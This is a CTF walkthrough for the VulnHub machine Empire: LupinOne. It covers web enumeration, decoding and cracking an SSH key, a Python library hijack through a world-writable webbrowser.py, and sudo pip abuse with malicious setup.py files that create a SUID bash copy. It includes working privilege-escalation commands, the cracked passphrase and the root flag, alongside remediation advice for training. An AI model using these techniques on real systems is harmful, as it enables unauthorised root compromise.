# Empire: LupinOne — VulnHub Walkthrough

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange) ![Status](https://img.shields.io/badge/Status-Rooted-success) ![Environment](https://img.shields.io/badge/Environment-VMware%20Workstation-lightgrey)

> **Spoiler warning:** This write-up contains the full attack path and the root flag. It is intended **only for an isolated, authorized CTF lab**.

## Machine Information

| Field | Value |
|---|---|
| Name | Empire: LupinOne |
| Platform | [VulnHub](https://www.vulnhub.com/entry/empire_lupinone,750/) |
| Author | icex64 & Empire Cybersecurity |
| Difficulty | Medium |
| Attacking machine | Kali Linux |
| Target machine | LupinOne Linux VM |
| Hypervisor | VMware Workstation |
| Network | Isolated lab network; IP assigned by DHCP |
| Objective | Obtain user and root access / flags |

**Important:** `https://www.vulnhub.com/entry/empire-breakout,751/` is the *different* machine **Empire: Breakout**. This document covers **Empire: LupinOne**, confirmed by the `LupinOne` hostname, `icex64`/`arsene` accounts, `heist.py`, and the root flag.

## Attack Path

```text
Kali Linux
   |
   +--> Network discovery and Nmap
   |
   +--> HTTP enumeration / robots.txt / hidden files
   |
   +--> Encoded SSH private key -> decoding -> passphrase cracking
   |
   +--> SSH access as icex64
           |
           +--> sudo -l: run heist.py as arsene
           |
           +--> Writable Python stdlib webbrowser.py
           |
           +--> Python Library Hijacking
                   |
                   +--> Shell as arsene
                           |
                           +--> sudo -l: NOPASSWD /usr/bin/pip as root
                           |
                           +--> Malicious local setup.py executed via pip
                           |
                           +--> Root-owned SUID Bash copy
                                   |
                                   +--> Effective UID 0
                                   +--> Read /root/root.txt
```

## 1. Lab Preparation

Import the Kali Linux and LupinOne virtual machines into VMware Workstation. Place **both VMs on the same host-only or otherwise isolated virtual network**. Start both machines and verify network connectivity. Do not bridge the intentionally vulnerable VM onto an untrusted production network.

Find the Kali IP and network interface:

```bash
ip -br addr
ip route
```

Identify the target by scanning the **lab subnet**, substituting your real CIDR:

```bash
sudo arp-scan --localnet
# Or, when the lab subnet is known:
sudo nmap -sn <LAB_SUBNET/CIDR>
```

Set a shell variable on Kali for convenience:

```bash
export TARGET=<TARGET_IP>
```

> **Evidence note:** Our preserved terminal session begins *after* the initial SSH foothold; the enumeration and SSH-key discovery steps below reconstruct the known LupinOne route from public walkthroughs. IPs and exact discovery outputs from the user's initial session were not retained, so placeholders are used rather than invented values.

## 2. Port Scanning

```bash
sudo nmap -sC -sV -p- --open -oN lupinone-nmap.txt "$TARGET"
```

This machine is reported to expose **SSH (22/tcp)** and **HTTP (80/tcp)**. Confirm against your own output.

Flags: `-sC` default scripts, `-sV` service detection, `-p-` all TCP ports, `--open` only open ports, `-oN` save output.

## 3. Web Enumeration

Inspect the website and robots rules:

```bash
curl -i "http://$TARGET/"
curl "http://$TARGET/robots.txt"
```

Public LupinOne walkthroughs identify a hint involving `~myfiles` and a user-directory-style URL. Enumerate candidate paths with a wordlist:

```bash
ffuf -u "http://$TARGET/~FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -fc 403
```

A discoverable `~secret` path provides clues about an SSH key, the user `icex64`, and the `fasttrack` wordlist. Continue enumerating possible hidden files:

```bash
ffuf -u "http://$TARGET/~secret/.FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.txt,.html -fc 403
```

The hidden resource contains an encoded SSH private key. Public walkthroughs identify its encoding as **Base58**. Retrieve the content from the discovered URL, decode the Base58 text, and save the resulting OpenSSH private key to `id_rsa`. For example, if the encoded text is saved locally as `encoded-key.txt` and Python's `base58` module is installed:

```bash
python3 - <<'PY'
from pathlib import Path
import base58
encoded = Path('encoded-key.txt').read_text().strip()
Path('id_rsa').write_bytes(base58.b58decode(encoded))
PY
chmod 600 id_rsa
head -n 1 id_rsa
```

The first line of a decoded OpenSSH key normally begins with `-----BEGIN OPENSSH PRIVATE KEY-----` (or another valid private-key PEM header). **Do not commit the private key to GitHub**, even if recovered in a training lab.

## 4. Crack the SSH Key Passphrase and Log In

Convert the private key into John the Ripper's input format:

```bash
ssh2john id_rsa > id_rsa.hash
# If ssh2john is not in PATH, locate its installation:
# find /usr/share -name 'ssh2john.py' 2>/dev/null
```

Use the wordlist hinted by the challenge:

```bash
john --wordlist=/usr/share/wordlists/fasttrack.txt id_rsa.hash
john --show id_rsa.hash
```

The passphrase reported by public walkthroughs is `P@55w0rd!`. It was **not independently observed in the preserved conversation**. With the key and passphrase:

```bash
ssh -i id_rsa icex64@"$TARGET"
whoami
id
ls -la ~
cat ~/user.txt
```

The next sections document the **commands and results actually confirmed in our lab session**.

## 5. Enumerate `icex64` Sudo Privileges — Confirmed

From the `icex64` shell:

```bash
sudo -l
```

Observed sudo rule:

```text
User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

Read the script:

```bash
cat /home/arsene/heist.py
```

Observed content:

```python
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```

Since `heist.py` imports Python's `webbrowser` module, the next question is whether any module file used by Python can be altered by `icex64`.

### 5.1 Failed attempts and what they taught us

The script directory is owned by `arsene`, so creating `/home/arsene/webbrowser.py` as `icex64` failed with **Permission denied**. The default `sys.path` also showed system-owned package directories. Setting a custom `PYTHONPATH` through sudo failed:

```bash
sudo -u arsene PYTHONPATH=/tmp/hijack /usr/bin/python3.9 /home/arsene/heist.py
```

```text
sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```

This was consistent with the `sudo -l` settings including `env_reset`. Rather than continuing with that blocked technique, we checked the actual standard-library module permissions.

## 6. Python Library Hijacking: `icex64` → `arsene` — Confirmed

```bash
ls -l /usr/lib/python3.9/webbrowser.py
```

Observed:

```text
-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py
```

`777` is a serious misconfiguration: **every local user can modify this root-owned standard-library file**. Because the allowed script imports `webbrowser`, a change to this file executes in the context of the allowed `arsene` process.

Back up the library first:

```bash
cp /usr/lib/python3.9/webbrowser.py /tmp/webbrowser.py.bak
```

Append the lab payload:

```bash
printf '\nimport os\nos.system("/bin/bash")\n' >> /usr/lib/python3.9/webbrowser.py
```

Execute the exact sudo-approved command:

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

Observed shell and verification:

```text
arsene@LupinOne:~$ whoami
arsene
arsene@LupinOne:~$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),...
```

**Result:** Code imported from a writable shared Python library was executed with the identity of `arsene`.

## 7. Enumerate `arsene` — Confirmed

The lab contained `/home/arsene/note.txt`, describing `heist.py` and its author's concern about account compromise. A private `.secret` file also existed and contained a password-like string. Its exact value is omitted here because it was **not required** for the exploit path.

```bash
cat /home/arsene/note.txt
ls -la /home/arsene
sudo -l
```

Observed sudo rule:

```text
User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

A normal `sudo -i` failed because the sudoers entry allowed **pip**, not `/bin/bash` or an unrestricted root login.

## 8. Sudo pip Abuse: `arsene` → `root` — Confirmed

The key insight: a Python package's legacy `setup.py` can execute code during package building. Running `pip` through the allowed sudo command therefore lets that code run with root privileges.

### 8.1 Proof of root code execution

Create a test package:

```bash
mkdir -p /tmp/rootpip2
cat > /tmp/rootpip2/setup.py <<'EOF'
from setuptools import setup
import os

os.system('id > /tmp/pip-root-check.txt')

setup(name='rootpip2', version='1.0')
EOF
```

Install from the local directory without downloading dependencies:

```bash
sudo /usr/bin/pip install /tmp/rootpip2 --no-build-isolation --no-deps
cat /tmp/pip-root-check.txt
```

**Actual observed result:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

This proves that the package build executed code as root, even though the interactive terminal remained `arsene` after pip finished.

### 8.2 Why the first Bash attempt did not persist

An earlier `setup.py` tried `os.system('/bin/bash')`. The installation completed, but `whoami` still displayed `arsene`: the subprocess ran as part of a non-interactive package build and did not leave an attached root shell. Also, `sudo pip install /dev/null` simply produced an invalid-requirement error; it was **not** a privilege escalation technique.

### 8.3 Obtain an effective-root shell with a lab-only SUID copy

Create a *separate* test package whose build step copies Bash to a temporary lab path and sets the set-user-ID permission. This avoids changing `/bin/bash` itself:

```bash
mkdir -p /tmp/rootpip3
cat > /tmp/rootpip3/setup.py <<'EOF'
from setuptools import setup
import os

os.system('cp /bin/bash /tmp/rootbash')
os.system('chmod 4755 /tmp/rootbash')

setup(name='rootpip3', version='1.0')
EOF
```

Trigger the root-privileged package build:

```bash
sudo /usr/bin/pip install /tmp/rootpip3 --no-build-isolation --no-deps
ls -l /tmp/rootbash
```

Expected file permissions:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Execute the copy with Bash's privileged mode:

```bash
/tmp/rootbash -p
id
```

With SUID and `-p`, the **effective UID** is root (`euid=0`), even if the real UID is still `arsene` (`uid=1000`). The lab's observed prompt became:

```text
rootbash-5.1#
```

The successful root flag read in the next section confirms that privileged access was obtained.

## 9. Root Flag — Confirmed

```bash
cd /root
ls -la
cat root.txt
```

The file printed ASCII art and the final flag:

```text
3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
```

**Machine completed: `icex64` → `arsene` → `root`.**

## 10. Lessons Learned and Remediation

| Finding | Why it matters | Recommended defense |
|---|---|---|
| World-writable standard-library module | An unprivileged account can alter code imported by a more privileged process | Correct ownership and permissions; monitor integrity of system Python files |
| Overly permissive sudo rule for Python script | The script inherits exploitable import dependencies | Restrict sudo privileges; audit both the script and imported modules |
| `NOPASSWD` root execution of `pip` | Package build hooks can execute arbitrary Python code as root | Do not allow package managers as unrestricted root sudo commands; use controlled deployment workflows |
| SUID Bash copy | Preserves elevated effective permissions after execution | Remove the test artifact; audit unexpected SUID files |

### Lab Cleanup

**After** finishing the challenge and exiting the privileged shell, restore the modified Python module and remove the SUID artifact. Run these commands only within the intentionally vulnerable VM:

```bash
# Execute as a sufficiently privileged user (the root-capable shell):
cp /tmp/webbrowser.py.bak /usr/lib/python3.9/webbrowser.py
rm -f /tmp/rootbash /tmp/pip-root-check.txt
rm -rf /tmp/rootpip /tmp/rootpip2 /tmp/rootpip3 /tmp/hijack
```

For reproducibility, a VM snapshot taken before exploitation is an even cleaner reset. Avoid publishing recovered private keys, hashes, passwords, or exported VM files.

## References

- [VulnHub: Empire: LupinOne (official machine page)](https://www.vulnhub.com/entry/empire_lupinone,750/)
- [GTFOBins: pip](https://gtfobins.github.io/gtfobins/pip/)
- [Ra-Sec: LupinOne walkthrough](https://ra2302.github.io/posts/LupinOne/)
- [Hacking Articles: Empire LupinOne walkthrough](https://www.hackingarticles.in/empire-lupinone-vulnhub-walkthrough/)

---

*Evidence policy: Post-SSH sudo rules, Python module permissions, command attempts, `arsene` identity, pip root-code test, and root flag were directly recorded during this lab. Earlier recon and SSH-key discovery are clearly presented as reconstructed steps from public walkthroughs, not as invented terminal output.*
